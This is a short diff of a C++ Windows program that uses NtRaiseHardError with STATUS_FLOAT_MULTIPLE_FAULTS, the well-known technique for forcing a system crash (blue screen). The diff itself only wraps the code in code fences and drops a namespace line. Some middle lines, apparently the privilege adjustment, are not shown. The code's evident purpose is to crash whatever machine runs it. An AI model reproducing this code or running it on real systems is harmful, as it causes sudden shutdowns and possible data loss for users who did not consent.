@@ -1,7 +1,7 @@
-#include <iostream>
+```#include <iostream>
 #include <Windows.h>
 #include <winternl.h>
-using namespace std;
+
 typedef NTSTATUS(NTAPI * NtRaiseHardError_p)(NTSTATUS, ULONG, ULONG, OPTIONAL, PULONG_PTR, ULONG, PULONG);
 typedef NTSTATUS(NTAPI * RtlAdjustPrivilege_p)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 int main()
@@ -12,3 +12,4 @@ int main()
     raise_error(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, nullptr); 
     return 0;
 }
+```
